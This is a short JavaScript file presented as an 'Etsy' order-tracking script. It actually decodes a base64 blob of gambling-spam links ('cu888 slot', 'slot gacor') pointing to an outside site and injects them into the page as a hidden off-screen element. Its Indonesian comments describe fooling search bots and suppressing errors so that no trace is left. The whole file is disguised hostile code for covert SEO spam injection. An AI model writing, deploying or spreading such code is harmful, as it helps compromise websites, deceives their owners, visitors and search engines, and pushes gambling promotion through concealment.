// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj5DVTg4ODwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj5DVSA4ODg8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+Y3U4ODggc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj5jdTg4OCBsb2dpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj4gY3U4ODggZGFmdGFyPC9hPgo8YSBocmVmPSJodHRwczovL3NvdXRoZXJudGllcnJlc291cmNlcy5jb20vY29udGFjdC8iPmN1ODg4IGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+Y3U4ODggbGluazwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj5jdTg4OCBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+Y3U4ODggbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL3NvdXRoZXJudGllcnJlc291cmNlcy5jb20vY29udGFjdC8iPmxpbmsgY3U4ODg8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+c2l0dXMgY3U4ODg8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+c2l0dXMgZ2Fjb3IgY3U4ODg8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+c2l0dXMgc2xvdCBjdTg4ODwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9zb3V0aGVybnRpZXJyZXNvdXJjZXMuY29tL2NvbnRhY3QvIj5zbG90IGdhY29yIGN1ODg4PC9hPgo8YSBocmVmPSJodHRwczovL3NvdXRoZXJudGllcnJlc291cmNlcy5jb20vY29udGFjdC8iPnNsb3QgZ2Fjb3I8L2E+CjxhIGhyZWY9Imh0dHBzOi8vc291dGhlcm50aWVycmVzb3VyY2VzLmNvbS9jb250YWN0LyI+c2xvdCBqYWNrcG90PC9hPgo8YSBocmVmPSJodHRwczovL3NvdXRoZXJudGllcnJlc291cmNlcy5jb20vY29udGFjdC8iPnNsb3Qgb25saW5lPC9hPgo8YSBocmVmPSJodHRwczovL3NvdXRoZXJudGllcnJlc291cmNlcy5jb20vY29udGFjdC8iPnNsb3QgZGVtbzwvYT4=";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
